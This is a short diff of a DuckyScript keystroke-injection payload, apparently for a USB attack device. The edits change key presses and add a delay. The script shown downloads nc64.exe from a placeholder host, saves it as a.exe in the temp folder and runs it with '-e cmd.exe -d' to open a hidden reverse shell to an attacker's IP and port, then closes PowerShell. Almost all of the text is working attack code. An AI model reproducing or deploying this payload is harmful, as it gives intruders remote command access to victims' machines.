@@ -16,10 +16,9 @@ DELAY 1000
 
 REM Set path to temp
 STRING $path = [System.IO.Path]::GetTempPath()
-SHIFT ENTER
+ENTER
 STRING Set-Location $path
-SHIFT ENTER
-
+ENTER
 
 REM Download nc64.exe
 STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile a.exe
@@ -28,6 +27,7 @@ ENTER
 REM Connect to listener
 STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
+DELAY 400
 
 REM Exit Powershell
 ALT F4
